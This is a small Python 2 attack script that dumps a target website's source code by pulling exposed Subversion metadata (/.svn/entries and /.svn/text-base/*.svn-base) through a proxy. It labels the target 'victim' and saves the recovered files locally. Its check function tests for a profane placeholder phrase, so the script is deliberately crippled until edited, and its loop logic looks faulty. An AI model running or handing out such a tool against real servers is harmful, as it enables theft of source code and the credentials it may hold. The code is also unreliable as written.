import os
import requests
import sys
saveto = sys.argv[3]
proxies = {'http' : sys.argv[2]}
victim = sys.argv[1]

def getct(url):
	r = requests.get(url, proxies=proxies)
	return r.content
def checkentries(filee):
  with open(filee, 'r') as file:
    for line in file:
      if 'edit this fucking yourselves' in line.split(): #edit yourselves
        return True
    else:
      return False
      
def getsvn(dir="/"):
	r = getct(victim + dir + '/.svn/entries')
	if not os.path.exists(saveto+'/' + dir):
		os.makedirs(saveto+'/' + dir)
	f = open(saveto+'/'+dir+'/entries', 'w')
	f.write(r)
	f.close()
	data = [line.strip() for line in open(saveto+'/'+dir+'/entries', 'r')]
	
	for i in range(len(data)):
		if checkentries(saveto+'/'+dir+'/entries')==True:
			if 'dir' in data[i]:
				if (data[i-1] != ''):
					print 'Fetching dir '+dir+'/'+data[i-1]+' ...'
					getsvn(dir + '/'+data[i-1]+'/')
			if 'file' in data[i]:
				if (data[i-1] != '') and data[i-1].find('.mp4')==-1:
					print 'Downloading file '+dir+'/'+data[i-1]+' ...'
					fg = getct(victim + dir + '/.svn/text-base/'+ data[i-1] + '.svn-base')
					f = open(saveto+'/' + dir + '/' + data[i-1], 'w')
					f.write(fg)
					f.close()

g = getsvn()
print g
